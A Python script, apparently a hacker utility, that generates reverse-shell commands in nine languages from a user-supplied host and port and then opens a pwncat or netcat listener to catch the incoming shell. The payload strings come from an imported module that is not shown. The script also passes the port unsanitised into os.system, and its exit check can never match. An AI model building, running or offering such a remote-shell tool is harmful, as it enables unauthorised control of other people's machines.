#!/usr/bin/python3

import payload
import sys
import time
import os

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'


logo = """
 _______  __   __  _______  ____   ____   ______    _______  __   __  _   ___  __    _  _______  _______  ______   
|       ||  | |  ||       ||    | |    | |    _ |  |  _    ||  |_|  || | |   ||  |  | ||       ||       ||    _ |  
|   ____||  |_|  ||___    | |   |  |   | |   | ||  | | |   ||       || |_|   ||   |_| ||       ||___    ||   | ||  
|  |____ |       | ___|   | |   |  |   | |   |_||_ | | |   ||       ||       ||       ||       | ___|   ||   |_||_ 
|_____  ||       ||___    | |   |  |   | |    __  || |_|   ||       ||___    ||  _    ||      _||___    ||    __  |
 _____| ||   _   | ___|   | |   |  |   | |   |  | ||       || ||_|| |    |   || | |   ||     |_  ___|   ||   |  | |
|_______||__| |__||_______| |___|  |___| |___|  |_||_______||_|   |_|    |___||_|  |__||_______||_______||___|  |_|
"""

print(bcolors.RED)
print(logo)
#print(bcolors.ENDC)


print("ReverseShell payload generator")
print("and Listening")

print(bcolors.ENDC)

banner = """

+---------------------------+
|                           |
|(1)    bash                |
|(2)    python2             |
|(3)    python3             |
|(4)    perl                |
|(5)    php                 |
|(6)    netcat(traditional) |
|(7)    netcat              |
|(8)    ruby                |
|(9)    golang              |
+---------------------------+

    [+]select mode

"""

time.sleep(1)

print(bcolors.GREEN)
print(banner)
print(bcolors.ENDC)

prompt = "5h311@R0m4nc3r:~$ "

mode = input(prompt)

if mode == 0:
    print("Bye!!!!")
    sys.exit()


host = input("[+]SET LHOST => ")
port = input("[+]SET LPORT => ")


if mode == "1":
    cmd = payload.bash(host,port)

if mode == "2":
    cmd = payload.python2(host,port)

if mode == "3":
    cmd = payload.python3(host,port)

if mode == "4":
    cmd = payload.perl(host,port)

if mode == "5":
    cmd = payload.php(host,port)

if mode == "6":
    cmd = payload.netcat_traditional(host,port)

if mode == "7":
    cmd = payload.netcat(host,port)

if mode == "8":
    cmd = payload.ruby(host,port)

if mode == "9":
    cmd = payload.golang(host,port)

print(bcolors.RED)    
print("-"*20)
print(" "*2)
print(bcolors.ENDC)
print(cmd)
print(bcolors.RED)
print(" "*2)
print("-"*20)
print(bcolors.ENDC)

try:
    os.system("pwncat -l "+port)

except:
    
    print("[!]pwncat is not found ")
    
finally:
    os.system("nc -nlvp "+port)

